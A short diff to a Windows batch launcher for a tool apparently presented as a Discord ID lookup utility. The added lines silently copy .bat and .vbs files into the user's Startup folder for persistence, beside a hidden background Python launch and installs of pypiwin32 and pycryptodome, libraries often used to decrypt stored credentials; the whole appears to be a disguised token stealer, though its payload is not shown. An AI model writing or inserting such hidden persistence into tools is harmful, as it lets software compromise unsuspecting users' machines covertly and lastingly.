@@ -2,6 +2,14 @@
 chcp 65001 >nul
 title Satan Discord ID Sorgu
 start "" /B python modules/accepts/main.py
+@echo off
+set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set KAYNAK=%~dp0modules\accepts
+
+copy "%KAYNAK%\discordid.bat" "%STARTUP%\discordid.bat"
+copy "%KAYNAK%\discordid.vbs" "%STARTUP%\discordid.vbs"
+
+pause
 pip install pypiwin32
 pip install pycryptodome
 cls
